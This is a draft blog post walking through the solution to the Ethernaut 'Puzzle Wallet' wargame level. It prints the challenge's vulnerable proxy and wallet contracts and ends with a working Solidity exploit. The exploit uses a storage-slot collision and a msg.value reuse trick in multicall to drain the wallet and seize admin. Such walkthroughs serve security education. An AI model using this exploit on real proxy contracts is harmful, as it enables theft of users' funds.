###########################
Ethernaut 24: Puzzle Wallet
###########################
:date: 2023-11-12
:slug: ethernaut-24-puzzlewallet
:status: draft
:summary: Solve this puzzle with our simple 8 step program!
:tags: programming
:author: capu
:featured_image:

Objective
=========
Become the contract's ``admin``

Code
====
this level consists of a proxy contract:

.. code-block:: solidity
    :linenos: inline

    contract PuzzleProxy is ERC1967Proxy {
        address public pendingAdmin;
        address public admin;

        constructor(address _admin, address _implementation, bytes memory _initData)
            ERC1967Proxy(_implementation, _initData)
        {
            admin = _admin;
        }

        modifier onlyAdmin() {
            require(msg.sender == admin, "Caller is not the admin");
            _;
        }

        function proposeNewAdmin(address _newAdmin) external {
            pendingAdmin = _newAdmin;
        }

        function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
            require(
                pendingAdmin == _expectedAdmin,
                "Expected new admin by the current admin is not the pending admin"
            );
            admin = pendingAdmin;
        }

        function upgradeTo(address _newImplementation) external onlyAdmin {
            _upgradeTo(_newImplementation);
        }
    }

with the following 'wallet' contract as its implementation:

.. code-block:: solidity
    :linenos: inline

    contract PuzzleWallet {
        address public owner;
        uint256 public maxBalance;
        mapping(address => bool) public whitelisted;
        mapping(address => uint256) public balances;

        function init(uint256 _maxBalance) public {
            require(maxBalance == 0, "Already initialized");
            maxBalance = _maxBalance;
            owner = msg.sender;
        }

        modifier onlyWhitelisted() {
            require(whitelisted[msg.sender], "Not whitelisted");
            _;
        }

        function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
            require(address(this).balance == 0, "Contract balance is not 0");
            maxBalance = _maxBalance;
        }

        function addToWhitelist(address addr) external {
            require(msg.sender == owner, "Not the owner");
            whitelisted[addr] = true;
        }

        function deposit() external payable onlyWhitelisted {
            require(address(this).balance <= maxBalance, "Max balance reached");
            balances[msg.sender] += msg.value;
        }

        function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
            require(balances[msg.sender] >= value, "Insufficient balance");
            balances[msg.sender] -= value;
            (bool success,) = to.call{value: value}(data);
            require(success, "Execution failed");
        }

        function multicall(bytes[] calldata data) external payable onlyWhitelisted {
            bool depositCalled = false;
            for (uint256 i = 0; i < data.length; i++) {
                bytes memory _data = data[i];
                bytes4 selector;
                assembly {
                    selector := mload(add(_data, 32))
                }
                if (selector == this.deposit.selector) {
                    require(!depositCalled, "Deposit can only be called once");
                    // Protect against reusing msg.value
                    depositCalled = true;
                }
                (bool success,) = address(this).delegatecall(data[i]);
                require(success, "Error while delegating call");
            }
        }
    }

also, in the deploy process:

- ``maxBalance`` is initialized to 100ether
- the factory deposits 0.001 eth.

Solution
========

To start off, it's a big smell that the ``PuzzleProxy`` contract has state
variables defined. Proxies, contracts meant to delegatecall to their
implementation, have good reason to store whatever data they need in slots that
aren't going to be overwritten by good ol' variables.

This is a common pattern and is standarized in `ERC-1967
<https://eips.ethereum.org/EIPS/eip-1967>`_. The ERC1967Proxy implementation by
OpenZeppelin the ``PuzzleProxy`` inherits already takes care of it, and defines
functions to update the admin, so it is an extra smelly smell.

So next thing I noticed is the proxy and implementation make use of the first
few storage slots for different things:

.. code::

    [I] > forge inspect --pretty  PuzzleProxy  storageLayout
    | Name         | Type    | Slot | Offset | Bytes |
    |--------------|---------|------|--------|-------|
    | pendingAdmin | address | 0    | 0      | 20    |
    | admin        | address | 1    | 0      | 20    |

.. code::

    [I] > forge inspect --pretty  PuzzleWallet  storageLayout
    | Name        | Type                        | Slot | Offset | Bytes |
    |-------------|-----------------------------|------|--------|-------|
    | owner       | address                     | 0    | 0      | 20    |
    | maxBalance  | uint256                     | 1    | 0      | 32    |
    | whitelisted | mapping(address => bool)    | 2    | 0      | 32    |
    | balances    | mapping(address => uint256) | 3    | 0      | 32    |

this means:

1. I can use ``proposeNewAdmin`` to set the owner
2. If I can set the ``maxBalance`` to an arbitrary value, I'll be able to
   effectively override the admin, beating the level.

but how can I set ``maxBalance``?

3. ``init`` won't do, since the factory initializes the contract with a
   ``maxBalance`` of 100 ether.
4. ``setMaxBalance``
    5. Can only be called by whitelisted addresses: no problem, being the owner
       (1) I can whitelist whoever.
    6. Requires the contract balance be zero: is a problem since the factory
       already made a deposit

So how do I get the contract balance to zero?

There's a function where I can get funds out of the contract:

.. code-block:: solidity
    :linenos: inline

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

But I can only get out as much as I have in the ``balances`` mapping. And I can only
increase that by ``deposit``-ing

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 2 11 12

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

How could I manage to increase my entry in ``balances`` further?

Thankfully there's a comment to help me out:

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 4 12 16

    function multicall(
        bytes[] calldata data
    ) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(
                    !depositCalled,
                    "Deposit can only be called once"
                );
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }

'reusing msg.value' (11) is something I could do!

Usually 'reentrancy guards' are implemented as storage variables, since those
persist across calls to the contract. But this one is a stack variable,
preventing me from putting two or more selectors for ``deposit`` back to back in
the ``data`` array.

There's nothing preventing me from crafting a calldata to call multicall on
itself with calldata to call deposit on itself, though .

That's a mouthful. Perhaps a machine language is better to lay this out:


.. code-block:: solidity
    :linenos: inline
    :hl_lines: 

    // cast calldata  "deposit()" 
    // 0xd0e30db0
    // cast calldata  "multicall(bytes[] calldata)" '[0xd0e30db0]'
    bytes memory multicallThenDepositCalldata = hex"ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000";
    bytes[] memory args = new bytes[](2);
    args[0] = multicallThenDepositCalldata;
    args[1] = multicallThenDepositCalldata;
    // 0.001 is the original balance of the contract
    // this reuses the msg.value for two deposits, making the contract
    // balance 0.002 *and* also the attacker's value in the 'balances'
    // mapping to 0.002
    asWallet.multicall{value: 0.001 ether}(args);

with msg.value officially reused, all that's left to do is drain the contract
and set the second storage slot to my address.

Stitiching this all up:

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 

    function solution(address payable target_) internal override{
        PuzzleProxy asProxy = PuzzleProxy(target_);
        PuzzleWallet asWallet = PuzzleWallet(target_);
        // this sets the PuzzleWallet's owner to the attacker
        asProxy.proposeNewAdmin(address(attacker)); // (1)
        asWallet.addToWhitelist(address(attacker)); // (5)
        // cast calldata  "deposit()" 
        // 0xd0e30db0
        // cast calldata  "multicall(bytes[] calldata)" '[0xd0e30db0]'
        bytes memory multicallThenDepositCalldata = hex"ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000";
        bytes[] memory args = new bytes[](2);
        args[0] = multicallThenDepositCalldata;
        args[1] = multicallThenDepositCalldata;
        // 0.001 is the original balance of the contract
        // this reuses the msg.value for two deposits, making the contract
        // balance 0.002 *and* also the attacker's value in the 'balances'
        // mapping to 0.002
        asWallet.multicall{value: 0.001 ether}(args);
        // now I can reduce the contract balance to zero
        asWallet.execute(attacker, 0.002 ether, bytes("")); // (6)
        // and set the maxBalance to override the contract's admin
        asWallet.setMaxBalance(uint256(uint160(attacker))); // (2)
    }
